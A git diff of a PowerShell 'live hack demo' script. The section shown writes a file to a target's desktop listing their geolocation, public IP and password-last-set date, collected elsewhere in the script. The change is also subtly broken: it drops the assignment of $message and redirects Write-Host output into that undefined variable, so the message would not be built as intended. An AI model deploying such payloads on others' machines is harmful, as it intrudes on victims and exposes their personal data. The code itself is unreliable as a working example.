@@ -679,14 +679,26 @@ $s.Speak($OUTRO)
 
 # this snippet will leave a message on your targets desktop 
 
-$message = "GM Chamber Live Hack Demo"
+Write-Host "GM Chamber Live Hack Demo" >> $message
+Write-Host "" >> $message
 
 if ($GL) { Write-Host "`nYour Location: `n$GL" >> $message }
+Write-Host "" >> $message
+
 if ($PubIP) { Write-Host "`nYour Public IP: $PubIP" >> $message }
+Write-Host "" >> $message
+
 if ($pls) { Write-Host "`nPassword Last Set: $pls" >> $message }
+Write-Host "" >> $message
 
-Write-Host "\n\n Stay Protected!!" + "\n\n Stay Compliant!!" + "\n\n Stay Safe!!" >> $message
+Write-Host "Stay Protected!!" >> $message
+Write-Host "" >> $message
 
+Write-Host "Stay Compliant!!" >> $message
+Write-Host "" >> $message
+
+Write-Host "Stay Safe!!" >> $message
+Write-Host "" >> $message
 Add-Content $home\Desktop\WithLove.txt $message
 ###########################################################################################################
 
